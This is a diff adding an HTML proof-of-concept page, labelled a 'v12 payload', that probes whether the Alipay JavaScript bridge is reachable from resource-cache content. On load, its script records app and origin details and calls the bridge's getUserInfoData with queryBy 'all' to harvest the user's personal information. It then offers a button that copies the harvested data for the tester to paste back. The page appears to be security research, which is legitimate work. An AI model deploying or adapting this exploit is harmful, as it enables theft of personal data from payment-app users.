@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RESOURCE ORIGIN PROBE v12</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:13px}
+  h3{color:#ff0;margin:10px 0 6px;font-size:14px}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:260px;overflow:auto}
+  button{width:100%;padding:16px;font-size:16px;background:#050;color:#0f0;border:2px solid #0f0;font-weight:bold;margin:10px 0}
+  .note{color:#0ff;margin:6px 0}
+</style>
+</head>
+<body>
+<h3>RESOURCE-CACHE ORIGIN PROBE (v12 payload)</h3>
+<p class="note">Kalaman ini di-load dari konten resource-cache (downloadFile) — bisa via iframe/blob di v12, atau dibuka langsung. Kalau bridge aktif di context ini = primitive render-escape.</p>
+<pre id="env">checking bridge...</pre>
+<pre id="pii">pending</pre>
+<button onclick="copyRes()">COPY RESOURCE PROBE RESULT</button>
+<script>
+(function(){
+  var R = {};
+  window.__v12res = 'RES-OK-' + (location.href || '').slice(0, 40);
+  window.__v12pii = null;
+  function set(id, o){
+    var el = document.getElementById(id);
+    try { el.textContent = (typeof o === 'string') ? o : JSON.stringify(o, null, 1); } catch(e) { el.textContent = String(o); }
+    R[id] = o;
+  }
+  window.copyRes = function(){
+    var lines = ['resourceProbe12 @ ' + location.href,
+      'env: ' + JSON.stringify(R.env || null),
+      'pii: ' + JSON.stringify(R.pii || null)];
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); alert('copied - paste balik'); } catch(e) { alert('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+  var done = false;
+  function go(){
+    if (done) return; done = true;
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('env', {hasBridge:!!window.AlipayJSBridge, appId:sp.appId, startScene:sp.startScene||sp.scene, href:(location.href||'').slice(0,90), origin:(function(){try{return location.origin}catch(e){return '?'}})(), ts:new Date().toISOString()});
+    if (window.AlipayJSBridge){
+      var got = false;
+      try {
+        window.AlipayJSBridge.call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'all'}}, function(r){ got = true; window.__v12pii = r; set('pii', r); });
+      } catch(e){ got = true; window.__v12pii = {__exception:String(e)}; set('pii', {__exception:String(e)}); }
+      setTimeout(function(){ if (!got) set('pii', {timeoutNoCallback:8000}); }, 8000);
+    } else {
+      set('pii', {noBridge:'bridge tidak tersedia di context ini'});
+    }
+  }
+  if (window.AlipayJSBridge) return go();
+  document.addEventListener('AlipayJSBridgeReady', go, false);
+  setTimeout(go, 5000);
+})();
+</script>
+</body>
+</html>
